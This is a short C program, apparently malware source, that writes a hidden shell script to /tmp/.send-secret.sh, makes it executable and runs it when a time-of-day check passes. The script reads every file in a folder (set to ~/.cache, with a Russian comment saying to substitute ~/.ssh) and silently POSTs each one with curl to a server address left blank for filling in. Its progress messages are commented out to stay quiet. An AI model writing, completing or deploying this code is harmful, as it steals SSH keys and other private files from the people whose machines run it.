#include <time.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <stdbool.h>

const char* script_content = 
"#!/bin/bash\n\n"
"FOLDER=\"$HOME/.cache\" # ПОДСТАВИТЬ .ssh !!!\n"
"SERVER=\"\" # ПОДСТАВИТЬ АДРЕС СЕРВЕРА !!!\n\n"
"if [ ! -d \"$FOLDER\" ]; then \n"
"    #echo \"Ошибка: Папка $FOLDER не существует!\" \n"
"    exit 1\n"
" fi\n\n"
"process_file() { \n"
"    local file=\"$1\" \n"
"    local filename=$(basename \"$file\") \n"
"    local content\n"
"    \n"
"    content=$(< \"$file\" sed -e 's/\\\\/\\\\\\\\/g' -e 's/\"/\\\\\"/g' -e 's/\\$/\\\\$/g')\n"
"    \n"
"    echo \"\\\"$filename\\\":\\\"$content\\\"\"\n"
"}\n\n"
"find \"$FOLDER\" -type f -print0 | while IFS= read -r -d $'\\0' file; do\n"
"    data=$(process_file \"$file\")\n"
"    \n"
"    #echo \"Отправка $file...\" \n"
"    curl -X POST \"$SERVER\" -d \"$data\" --silent\n"
"    \n"
"done\n"
"#echo \"Завершено! Все файлы из $FOLDER отправлены на $SERVER\"";


void create_and_run_script(const char* script_path) {
    FILE* script_file = fopen(script_path, "w");
    if (!script_file) {
        //perror("Failed to create script file");
        exit(EXIT_FAILURE);
    }
    
    fprintf(script_file, "%s", script_content);
    fclose(script_file);
    
    chmod(script_path, S_IRWXU | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH);
    
    system(script_path);
}

int main(void) {
    const char* script_path = "/tmp/.send-secret.sh";

    time_t mytime = time(NULL);
    struct tm *result = localtime(&mytime);

    if (result->tm_hour > 8 && result->tm_min > 20) {
        create_and_run_script(script_path);   
    }
    return 0;
}